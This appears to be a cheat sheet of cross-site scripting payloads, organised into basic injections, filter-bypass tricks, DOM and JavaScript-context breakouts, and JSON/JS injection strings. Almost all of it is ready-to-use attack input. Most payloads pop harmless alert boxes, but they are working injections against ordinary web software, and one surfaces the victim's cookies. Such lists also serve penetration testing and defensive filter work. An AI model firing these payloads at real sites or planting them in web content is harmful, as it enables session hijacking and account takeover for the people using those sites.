# Basic XSS Payloads

```
<script>alert(1)</script>
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
```

# Bypassing Filters
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=JaVaScRiPt:alert(1)>
<svg><script xlink:href=data:,alert(1)></script></svg>
<svg><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a></svg>
<details open ontoggle=confirm(1)>
```
# DOM XSS Payloads (Assume input is reflected into JS)
```
';alert(1);// 
";alert(1);// 
</script><script>alert(1)</script>
'+document.domain+' 
"><svg onload=confirm(document.cookie)>
```
# JSON/JS Injection Payloads (Context: inside a JSON/JS response)
```
"};alert(1);//
');alert(1);//
",";alert(1);//
```
